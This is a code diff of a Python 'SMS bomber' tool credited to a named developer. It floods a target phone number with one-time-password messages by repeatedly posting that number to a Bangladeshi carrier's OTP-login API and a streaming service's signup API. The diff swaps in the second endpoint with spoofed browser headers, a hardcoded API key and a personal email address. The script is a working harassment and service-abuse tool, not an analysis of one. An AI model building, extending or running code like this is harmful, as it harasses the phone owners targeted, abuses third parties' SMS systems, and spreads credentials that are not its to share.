@@ -1,4 +1,3 @@
-
 import os
 import requests
 import time
@@ -62,18 +61,26 @@ while tt<2:
 		totalnotsent=0
 		while ammount2<ammount+1:
 			try:
-				if "yy" in number or "yyy" in number:
+				if "yyy" in number or "yyy" in number:
 					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
 						
 				else:
-					url=url = "https://0yzk2chfm3.execute-api.ap-southeast-1.amazonaws.com/prod/user/otp"
-					headers=CaseInsensitiveDict()
-					headers["Content-Type"]="application/json"
-					datagp="""{\"mobile_number\":\"+88"""+number+"""\"}"""
-					r=requests.post(url, headers=headers, data=datagp)
-					
-						
-						
+					url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
+					headers = CaseInsensitiveDict()
+					headers["Host"] = "prod-api.viewlift.com"
+					headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
+					headers["Accept"] = "application/json, text/plain, */*"
+					headers["Accept-Language"] = "en-US,en;q=0.5"
+					headers["Accept-Encoding"] = "gzip, deflate, br"
+					headers["Content-Type"] = "application/json"
+					headers["Content-Length"] = "128"
+					headers["x-api-key"] = "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
+					headers["Origin"] = "https://www.hoichoi.tv"
+					headers["Referer"] = "https://www.hoichoi.tv/"
+					headers["Connection"] = "keep-alive"
+					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
+					r= requests.post(url, headers=headers, data=data)
+												
 				if ammount2==1:
 					print(cyan+"\n\t  ★★ROC-X★★==>   "+green+"[✓] 1st SMS Sent.")
 				elif ammount2==2:
@@ -111,7 +118,7 @@ while tt<2:
 		opt()
 	
 			
-	elif opt2=="2":
+	elif opt2=="3":
 		os.system("python3 main2.py")
 	else:
 		text=cyan+"\t\tDeveloped By : Sanaur Asif"+green+"\n\n\t\t★★ ROC-X BD SMS Bomber ★★   \n" 
